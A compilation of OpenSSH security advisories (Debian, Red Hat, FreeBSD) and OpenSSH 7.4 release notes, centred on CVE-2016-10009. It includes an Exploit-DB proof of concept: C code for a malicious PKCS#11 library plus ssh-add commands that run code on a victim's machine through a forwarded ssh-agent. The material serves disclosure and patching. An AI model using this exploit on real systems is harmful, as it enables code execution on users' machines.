 Also see the "Get Slack" section on http://slackware.com for additional mirror sites near you.

Debian Bug     : 790798 793616 795711 848716 848717

Several vulnerabilities have been found in OpenSSH, a free implementation
of the SSH protocol suite:

CVE-2015-5352

    OpenSSH incorrectly verified time window deadlines for X connections.
    Remote attackers could take advantage of this flaw to bypass intended
    access restrictions. Reported by Jann Horn.

CVE-2015-5600

    OpenSSH improperly restricted the processing of keyboard-interactive
    devices within a single connection, which could allow remote attackers
    to perform brute-force attacks or cause a denial of service, in a
    non-default configuration.

CVE-2015-6563

    OpenSSH incorrectly handled usernames during PAM authentication. In
    conjunction with an additional flaw in the OpenSSH unprivileged child
    process, remote attackers could make use if this issue to perform user
    impersonation. Discovered by Moritz Jodeit.

CVE-2015-6564

    Moritz Jodeit discovered a use-after-free flaw in PAM support in
    OpenSSH, that could be used by remote attackers to bypass
    authentication or possibly execute arbitrary code.

CVE-2016-1908

    OpenSSH mishandled untrusted X11 forwarding when the X server disables
    the SECURITY extension. Untrusted connections could obtain trusted X11
    forwarding privileges. Reported by Thomas Hoger.

CVE-2016-3115

    OpenSSH improperly handled X11 forwarding data related to
    authentication credentials. Remote authenticated users could make use
    of this flaw to bypass intended shell-command restrictions. Identified
    by github.com/tintinweb.

CVE-2016-6515

    OpenSSH did not limit password lengths for password authentication.
    Remote attackers could make use of this flaw to cause a denial of
    service via long strings.

CVE-2016-10009

    Jann Horn discovered an untrusted search path vulnerability in
    ssh-agent allowing remote attackers to execute arbitrary local
    PKCS#11 modules by leveraging control over a forwarded agent-socket.

CVE-2016-10011

    Jann Horn discovered that OpenSSH did not properly consider the
    effects of realloc on buffer contents. This may allow local users to
    obtain sensitive private-key information by leveraging access to a
    privilege-separated child process.

CVE-2016-10012

    Guido Vranken discovered that the OpenSSH shared memory manager
    did not ensure that a bounds check was enforced by all compilers,
    which could allow local users to gain privileges by leveraging access
    to a sandboxed privilege-separation process.

CVE-2016-10708

    NULL pointer dereference and daemon crash via an out-of-sequence
    NEWKEYS message.

CVE-2017-15906

    Michal Zalewski reported that OpenSSH improperly prevent write
    operations in readonly mode, allowing attackers to create zero-length
    files.

For Debian 8 "Jessie", these problems have been fixed in version
1:6.7p1-5+deb8u6.

We recommend that you upgrade your openssh packages.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2017%3A2029)

## Topic

An update for openssh is now available for Red Hat Enterprise Linux 7.

Red Hat Product Security has rated this update as having a security impact of Moderate. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

OpenSSH is an SSH protocol implementation supported by a number of Linux, UNIX, and similar operating systems. It includes the core files necessary for both the OpenSSH client and server.

The following packages have been upgraded to a later upstream version: openssh (7.4p1). (BZ#1341754)

Security Fix(es):

* A covert timing channel flaw was found in the way OpenSSH handled authentication of non-existent users. A remote unauthenticated attacker could possibly use this flaw to determine valid user names by measuring the timing of server responses. (CVE-2016-6210)
* It was found that OpenSSH did not limit password lengths for password authentication. A remote unauthenticated attacker could use this flaw to temporarily trigger high CPU consumption in sshd by sending long passwords. (CVE-2016-6515)
* It was found that ssh-agent could load PKCS#11 modules from arbitrary paths. An attacker having control of the forwarded agent-socket on the server, and the ability to write to the filesystem of the client host, could use this flaw to execute arbitrary code with the privileges of the user running ssh-agent. (CVE-2016-10009)
* It was found that the host private key material could possibly leak to the privilege-separated child processes via re-allocated memory. An attacker able to compromise the privilege-separated process could therefore obtain the leaked key information. (CVE-2016-10011)
* It was found that the boundary checks in the code implementing support for pre-authentication compression could have been optimized out by certain compilers. An attacker able to compromise the privilege-separated process could possibly use this flaw for further attacks against the privileged monitor process. (CVE-2016-10012)

Additional Changes:

For detailed information on changes in this release, see the Red Hat Enterprise Linux 7.4 Release Notes linked from the References section.

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

After installing this update, the OpenSSH server daemon (sshd) will be restarted automatically.

# OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading

#### EDB-ID:

###### 40963

#### CVE:

###### [2016-10009](https://nvd.nist.gov/vuln/detail/CVE-2016-10009)

---

**EDB Verified:**

#### Author:

###### [Google Security Research](/?author=7725)

#### Type:

###### [remote](/?type=remote)

---

**Vulnerable App:**

```
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1009

The OpenSSH agent permits its clients to load PKCS11 providers using the commands SSH_AGENTC_ADD_SMARTCARD_KEY and SSH_AGENTC_ADD_SMARTCARD_KEY_CONSTRAINED if OpenSSH was compiled with the ENABLE_PKCS11 flag (normally enabled) and the agent isn't locked. For these commands, the client has to specify a provider name. The agent passes this provider name to a subprocess (via ssh-agent.c:process_add_smartcard_key -> ssh-pkcs11-client.c:pkcs11_add_provider -> ssh-pkcs11-client.c:send_msg), and the subprocess receives it and passes it to dlopen() (via ssh-pkcs11-helper.c:process -> ssh-pkcs11-helper.c:process_add -> ssh-pkcs11.c:pkcs11_add_provider -> dlopen). No checks are performed on the provider name, apart from testing whether that provider is already loaded.

This means that, if a user connects to a malicious SSH server with agent forwarding enabled and the malicious server has the ability to place a file with attacker-controlled contents in the victim's filesystem, the SSH server can execute code on the user's machine.

To reproduce the issue, first create a library that executes some command when it is loaded:

$ cat evil_lib.c
#include <stdlib.h>
__attribute__((constructor)) static void run(void) {
  // in case you're loading this via LD_PRELOAD or LD_LIBRARY_PATH,
  // prevent recursion through system()
  unsetenv("LD_PRELOAD");
  unsetenv("LD_LIBRARY_PATH");
  system("id > /tmp/test");
}
$ gcc -shared -o evil_lib.so evil_lib.c -fPIC -Wall

Connect to another machine using "ssh -A". Then, on the remote machine:

$ ssh-add -s [...]/evil_lib.so
Enter passphrase for PKCS#11: [just press enter here]
SSH_AGENT_FAILURE
Could not add card: [...]/evil_lib.so

At this point, the command "id > /tmp/test" has been executed on the machine running the ssh agent:

$ cat /tmp/test
uid=1000(user) gid=1000(user) groups=[...]

Fixed in http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/usr.bin/ssh/ssh-agent.c.diff?r1=1.214&r2=1.215&f=h

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

encrypted and authenticated transport for a variety of services,
including remote shell access.
OpenSSH supports accessing keys provided by a PKCS#11 token.
II. Problem Description
The ssh-agent(1) agent supports loading a PKCS#11 module from outside a
trusted whitelist. An attacker can request loading of a PKCS#11 module
across forwarded agent-socket. [CVE-2016-10009]
When privilege separation is disabled, forwarded Unix domain sockets
would be created by sshd(8) with the privileges of 'root' instead of
the authenticated user. [CVE-2016-10010]
III. Impact
A remote attacker who have control of a forwarded agent-socket on a
remote system and have the ability to write files on the system
running ssh-agent(1) agent can run arbitrary code under the same user
credential. Because the attacker must already have some control on
both systems, it is relatively hard to exploit this vulnerability in
a practical attack. [CVE-2016-10009]
When privilege separation is disabled (on FreeBSD, privilege separation
is enabled by default and has to be explicitly disabled), an authenticated
attacker can potentially gain root privileges on systems running OpenSSH
server. [CVE-2016-10010]
IV. Workaround
Systems not running ssh-agent(1) and sshd(8) services are not affected.
System administrators may remove ssh-agent(1) to mitigate CVE-2016-10009.
System administrators should enable privilege separation when running
OpenSSH server, which is the FreeBSD default, to mitigate CVE-2016-10010.
V. Solution
Perform one of the following:
1) Upgrade your vulnerable system to a supported FreeBSD stable or
release / security branch (releng) dated after the correction date.
Kill all running ssh-agent(1) process and restart sshd(8) service.
A reboot is recommended but not required.
2) To update your vulnerable system via a binary patch:
Systems running a RELEASE version of FreeBSD on the i386 or amd64
platforms can be updated via the freebsd-update(8) utility:
# freebsd-update fetch
# freebsd-update install
Kill all running ssh-agent(1) process and restart sshd(8) service.
A reboot is recommended but not required.
3) To update your vulnerable system via a source code patch:
The following patches have been verified to apply to the applicable
FreeBSD release branches.
a) Download the relevant patch from the location below, and verify the
detached PGP signature using your PGP utility.
# fetch https://security.FreeBSD.org/patches/SA-17:01/openssh.patch
# fetch https://security.FreeBSD.org/patches/SA-17:01/openssh.patch.asc
# gpg --verify openssh.patch.asc
b) Apply the patch. Execute the following commands as root:
# cd /usr/src
# patch < /path/to/patch
c) Recompile the operating system using buildworld and installworld as
described in .
Kill all running ssh-agent(1) process and restart sshd(8) service.
A reboot is recommended but not required.

Subject: Announce: OpenSSH 7.4 released

OpenSSH 7.4 has just been released. It will be available from the
mirrors listed at <http://www.openssh.com/> shortly.

OpenSSH is a 100% complete SSH protocol 2.0 implementation and
includes sftp client and server support. OpenSSH also includes
transitional support for the legacy SSH 1.3 and 1.5 protocols
that may be enabled at compile-time.

Once again, we would like to thank the OpenSSH community for their
continued support of the project, especially those who contributed
code or patches, reported bugs, tested snapshots or donated to the
project. More information on donations may be found at:
<http://www.openssh.com/donations.html>

Future deprecation notice
=========================

We plan on retiring more legacy cryptography in future releases,
specifically:

 * In approximately August 2017, removing remaining support for the
   SSH v.1 protocol (client-only and currently compile-time disabled).

 * In the same release, removing support for Blowfish and RC4 ciphers
   and the RIPE-MD160 HMAC. (These are currently run-time disabled).

 * Refusing all RSA keys smaller than 1024 bits (the current minimum
   is 768 bits)

 * The next release of OpenSSH will remove support for running sshd(8)
   with privilege separation disabled.

 * The next release of portable OpenSSH will remove support for
   OpenSSL version prior to 1.0.1.

This list reflects our current intentions, but please check the final
release notes for future releases.

Potentially-incompatible changes
================================

This release includes a number of changes that may affect existing
configurations:

 * This release removes server support for the SSH v.1 protocol.

 * ssh(1): Remove 3des-cbc from the client's default proposal. 64-bit
   block ciphers are not safe in 2016 and we don't want to wait until
   attacks like SWEET32 are extended to SSH. As 3des-cbc was the
   only mandatory cipher in the SSH RFCs, this may cause problems
   connecting to older devices using the default configuration,
   but it's highly likely that such devices already need explicit
   configuration for key exchange and hostkey algorithms already
   anyway.

 * sshd(8): Remove support for pre-authentication compression.
   Doing compression early in the protocol probably seemed reasonable
   in the 1990s, but today it's clearly a bad idea in terms of both
   cryptography (cf. multiple compression oracle attacks in TLS) and
   attack surface. Pre-auth compression support has been disabled by
   default for >10 years. Support remains in the client.

 * ssh-agent will refuse to load PKCS#11 modules outside a whitelist
   of trusted paths by default. The path whitelist may be specified
   at run-time.

 * sshd(8): When a forced-command appears in both a certificate and
   an authorized keys/principals command= restriction, sshd will now
   refuse to accept the certificate unless they are identical.
   The previous (documented) behaviour of having the certificate
   forced-command override the other could be a bit confusing and
   error-prone.

 * sshd(8): Remove the UseLogin configuration directive and support
   for having /bin/login manage login sessions.

Changes since OpenSSH 7.3
=========================

This is primarily a bugfix release.

Security
--------

 * ssh-agent(1): Will now refuse to load PKCS#11 modules from paths
   outside a trusted whitelist (run-time configurable). Requests to
   load modules could be passed via agent forwarding and an attacker
   could attempt to load a hostile PKCS#11 module across the forwarded
   agent channel: PKCS#11 modules are shared libraries, so this would
   result in code execution on the system running the ssh-agent if the
   attacker has control of the forwarded agent-socket (on the host
   running the sshd server) and the ability to write to the filesystem
   of the host running ssh-agent (usually the host running the ssh
   client). Reported by Jann Horn of Project Zero.

 * sshd(8): When privilege separation is disabled, forwarded Unix-
   domain sockets would be created by sshd(8) with the privileges of
   'root' instead of the authenticated user. This release refuses
   Unix-domain socket forwarding when privilege separation is disabled
   (Privilege separation has been enabled by default for 14 years).
   Reported by Jann Horn of Project Zero.

 * sshd(8): Avoid theoretical leak of host private key material to
   privilege-separated child processes via realloc() when reading
   keys. No such leak was observed in practice for normal-sized keys,
   nor does a leak to the child processes directly expose key material
   to unprivileged users. Reported by Jann Horn of Project Zero.

 * sshd(8): The shared memory manager used by pre-authentication
   compression support had a bounds checks that could be elided by
   some optimising compilers. Additionally, this memory manager was
   incorrectly accessible when pre-authentication compression was
   disabled. This could potentially allow attacks against the
   privileged monitor process from the sandboxed privilege-separation
   process (a compromise of the latter would be required first).
   This release removes support for pre-authentication compression
   from sshd(8). Reported by Guido Vranken using the Stack unstable
   optimisation identification tool (<http://css.csail.mit.edu/stack/>)

 * sshd(8): Fix denial-of-service condition where an attacker who
   sends multiple KEXINIT messages may consume up to 128MB per
   connection. Reported by Shi Lei of Gear Team, Qihoo 360.

 * sshd(8): Validate address ranges for AllowUser and DenyUsers
   directives at configuration load time and refuse to accept invalid
   ones. It was previously possible to specify invalid CIDR address
   ranges (e.g. user@....1.2.3/55) and these would always match,
   possibly resulting in granting access where it was not intended.
   Reported by Laurence Parry.

New Features
------------

 * ssh(1): Add a proxy multiplexing mode to ssh(1) inspired by the
   version in PuTTY by Simon Tatham. This allows a multiplexing
   client to communicate with the master process using a subset of
   the SSH packet and channels protocol over a Unix-domain socket,
   with the main process acting as a proxy that translates channel
   IDs, etc.  This allows multiplexing mode to run on systems that
   lack file- descriptor passing (used by current multiplexing
   code) and potentially, in conjunction with Unix-domain socket
   forwarding, with the client and multiplexing master process on
   different machines. Multiplexing proxy mode may be invoked using
   "ssh -O proxy ..."

 * sshd(8): Add a sshd_config DisableForwaring option that disables
   X11, agent, TCP, tunnel and Unix domain socket forwarding, as well
   as anything else we might implement in the future. Like the
   'restrict' authorized_keys flag, this is intended to be a simple
   and future-proof way of restricting an account.

 * sshd(8), ssh(1): Support the "curve25519-sha256" key exchange
   method. This is identical to the currently-supported method named
   "curve25519-sha256@...ssh.org".

 * sshd(8): Improve handling of SIGHUP by checking to see if sshd is
   already daemonised at startup and skipping the call to daemon(3)
   if it is. This ensures that a SIGHUP restart of sshd(8) will
   retain the same process-ID as the initial execution. sshd(8) will
   also now unlink the PidFile prior to SIGHUP restart and re-create
   it after a successful restart, rather than leaving a stale file in
   the case of a configuration error. bz#2641

 * sshd(8): Allow ClientAliveInterval and ClientAliveCountMax
   directives to appear in sshd_config Match blocks.

 * sshd(8): Add %-escapes to AuthorizedPrincipalsCommand to match
   those supported by AuthorizedKeysCommand (key, key type,
   fingerprint, etc.) and a few more to provide access to the
   contents of the certificate being offered.

 * Added regression tests for string matching, address matching and
   string sanitisation functions.

 * Improved the key exchange fuzzer harness.

Bugfixes
--------

 * ssh(1): Allow IdentityFile to successfully load and use
   certificates that have no corresponding bare public key. bz#2617
   certificate id_rsa-cert.pub (and no id_rsa.pub).

 * ssh(1): Fix public key authentication when multiple
   authentication is in use and publickey is not just the first
   method attempted. bz#2642

   detail in debug messages. bz#2610

 * ssh(1): When tearing down ControlMaster connections, don't
   pollute stderr when LogLevel=quiet.

=== Content from www.openssh.com_6f042d16_20250126_080147.html ===
OpenSSH 7.4 was released on 2016-12-19. It is available from the
mirrors listed at https://www.openssh.com/.
OpenSSH is a 100% complete SSH protocol 2.0 implementation and
includes sftp client and server support. OpenSSH also includes
transitional support for the legacy SSH 1.3 and 1.5 protocols
that may be enabled at compile-time.
Once again, we would like to thank the OpenSSH community for their
continued support of the project, especially those who contributed
code or patches, reported bugs, tested snapshots or donated to the
project. More information on donations may be found at:
http://www.openssh.com/donations.html
Future deprecation notice
=========================
We plan on retiring more legacy cryptography in future releases,
specifically:
\* In approximately August 2017, removing remaining support for the
SSH v.1 protocol (client-only and currently compile-time disabled).
\* In the same release, removing support for Blowfish and RC4 ciphers
and the RIPE-MD160 HMAC. (These are currently run-time disabled).
\* Refusing all RSA keys smaller than 1024 bits (the current minimum
is 768 bits)
\* The next release of OpenSSH will remove support for running sshd(8)
with privilege separation disabled.
\* The next release of portable OpenSSH will remove support for
OpenSSL version prior to 1.0.1.
This list reflects our current intentions, but please check the final
release notes for future releases.
Potentially-incompatible changes
================================
This release includes a number of changes that may affect existing
configurations:
\* This release removes server support for the SSH v.1 protocol.
\* ssh(1): Remove 3des-cbc from the client's default proposal. 64-bit
block ciphers are not safe in 2016 and we don't want to wait until
attacks like SWEET32 are extended to SSH. As 3des-cbc was the
only mandatory cipher in the SSH RFCs, this may cause problems
connecting to older devices using the default configuration,
but it's highly likely that such devices already need explicit
configuration for key exchange and hostkey algorithms already
anyway.
\* sshd(8): Remove support for pre-authentication compression.
Doing compression early in the protocol probably seemed reasonable
in the 1990s, but today it's clearly a bad idea in terms of both
cryptography (cf. multiple compression oracle attacks in TLS) and
attack surface. Pre-auth compression support has been disabled by
default for >10 years. Support remains in the client.
\* ssh-agent will refuse to load PKCS#11 modules outside a whitelist
of trusted paths by default. The path whitelist may be specified
at run-time.
\* sshd(8): When a forced-command appears in both a certificate and
an authorized keys/principals command= restriction, sshd will now
refuse to accept the certificate unless they are identical.
The previous (documented) behaviour of having the certificate
forced-command override the other could be a bit confusing and
error-prone.
\* sshd(8): Remove the UseLogin configuration directive and support
for having /bin/login manage login sessions.
Changes since OpenSSH 7.3
=========================
This is primarily a bugfix release.
Security
--------
\* ssh-agent(1): Will now refuse to load PKCS#11 modules from paths
outside a trusted whitelist (run-time configurable). Requests to
load modules could be passed via agent forwarding and an attacker
could attempt to load a hostile PKCS#11 module across the forwarded
agent channel: PKCS#11 modules are shared libraries, so this would
result in code execution on the system running the ssh-agent if the
attacker has control of the forwarded agent-socket (on the host
running the sshd server) and the ability to write to the filesystem
of the host running ssh-agent (usually the host running the ssh
client). Reported by Jann Horn of Project Zero.
\* sshd(8): When privilege separation is disabled, forwarded Unix-
domain sockets would be created by sshd(8) with the privileges of
'root' instead of the authenticated user. This release refuses
Unix-domain socket forwarding when privilege separation is disabled
(Privilege separation has been enabled by default for 14 years).
Reported by Jann Horn of Project Zero.
\* sshd(8): Avoid theoretical leak of host private key material to
privilege-separated child processes via realloc() when reading
keys. No such leak was observed in practice for normal-sized keys,
nor does a leak to the child processes directly expose key material
to unprivileged users. Reported by Jann Horn of Project Zero.
\* sshd(8): The shared memory manager used by pre-authentication
compression support had a bounds checks that could be elided by
some optimising compilers. Additionally, this memory manager was
incorrectly accessible when pre-authentication compression was
disabled. This could potentially allow attacks against the
privileged monitor process from the sandboxed privilege-separation
process (a compromise of the latter would be required first).
This release removes support for pre-authentication compression
from sshd(8). Reported by Guido Vranken using the Stack unstable
optimisation identification tool (http://css.csail.mit.edu/stack/)
\* sshd(8): Fix denial-of-service condition where an attacker who
sends multiple KEXINIT messages may consume up to 128MB per
connection. Reported by Shi Lei of Gear Team, Qihoo 360.
\* sshd(8): Validate address ranges for AllowUser and DenyUsers
directives at configuration load time and refuse to accept invalid
ones. It was previously possible to specify invalid CIDR address
ranges (e.g. user@127.1.2.3/55) and these would always match,
possibly resulting in granting access where it was not intended.
Reported by Laurence Parry.
New Features
------------
\* ssh(1): Add a proxy multiplexing mode to ssh(1) inspired by the
version in PuTTY by Simon Tatham. This allows a multiplexing
client to communicate with the master process using a subset of
the SSH packet and channels protocol over a Unix-domain socket,
with the main process acting as a proxy that translates channel
IDs, etc. This allows multiplexing mode to run on systems that
lack file- descriptor passing (used by current multiplexing
code) and potentially, in conjunction with Unix-domain socket
forwarding, with the client and multiplexing master process on
different machines. Multiplexing proxy mode may be invoked using
"ssh -O proxy ..."
\* sshd(8): Add a sshd\_config DisableForwarding option that disables
X11, agent, TCP, tunnel and Unix domain socket forwarding, as well
as anything else we might implement in the future. Like the
'restrict' authorized\_keys flag, this is intended to be a simple
and future-proof way of restricting an account.
\* sshd(8), ssh(1): Support the "curve25519-sha256" key exchange
method. This is identical to the currently-supported method named
"curve25519-sha256@libssh.org".
\* sshd(8): Improve handling of SIGHUP by checking to see if sshd is
already daemonised at startup and skipping the call to daemon(3)
if it is. This ensures that a SIGHUP restart of sshd(8) will
retain the same process-ID as the initial execution. sshd(8) will
also now unlink the PidFile prior to SIGHUP restart and re-create
it after a successful restart, rather than leaving a stale file in
the case of a configuration error. bz#2641
\* sshd(8): Allow ClientAliveInterval and ClientAliveCountMax
directives to appear in sshd\_config Match blocks.
\* sshd(8): Add %-escapes to AuthorizedPrincipalsCommand to match
those supported by AuthorizedKeysCommand (key, key type,
fingerprint, etc.) and a few more to provide access to the
contents of the certificate being offered.
\* Added regression tests for string matching, address matching and
string sanitisation functions.
\* Improved the key exchange fuzzer harness.
Bugfixes
--------
\* ssh(1): Allow IdentityFile to successfully load and use
certificates that have no corresponding bare public key. bz#2617
certificate id\_rsa-cert.pub (and no id\_rsa.pub).
\* ssh(1): Fix public key authentication when multiple
authentication is in use and publickey is not just the first
method attempted. bz#2642
\* regress: Allow the PuTTY interop tests to run unattended. bz#2639
\* ssh-agent(1), ssh(1): improve reporting when attempting to load
keys from PKCS#11 tokens with fewer useless log messages and more
detail in debug messages. bz#2610
\* ssh(1): When tearing down ControlMaster connections, don't
pollute stderr when LogLevel=quiet.
\* sftp(1): On ^Z wait for underlying ssh(1) to suspend before
suspending sftp(1) to ensure that ssh(1) restores the terminal mode
correctly if suspended during a password prompt.
\* ssh(1): Avoid busy-wait when ssh(1) is suspended during a password
prompt.
\* ssh(1), sshd(8): Correctly report errors during sending of ext-
info messages.
\* sshd(8): fix NULL-deref crash if sshd(8) received an out-of-
sequence NEWKEYS message.
\* sshd(8): Correct list of supported signature algorithms sent in
the server-sig-algs extension. bz#2547
\* sshd(8): Fix sending ext\_info message if privsep is disabled.
\* sshd(8): more strictly enforce the expected ordering of privilege
separation monitor calls used for authentication and allow them
only when their respective authentication methods are enabled

-fsanitize-memory.
\* sshd\_config(5): Use 2001:db8::/32, the official IPv6 subnet for
configuration examples.
Portability

\* On environments configured with Turkish locales, fall back to the
C/POSIX locale to avoid errors in configuration parsing caused by
that locale's unique handling of the letters 'i' and 'I'. bz#2643

\* ssh(1), sshd(8): Unbreak AES-CTR ciphers on old (~0.9.8) OpenSSL.
\* Fix compilation for libcrypto compiled without RIPEMD160 support.
\* contrib: Add a gnome-ssh-askpass3 with GTK+3 support. bz#2640
\* sshd(8): Improve PRNG reseeding across privilege separation and
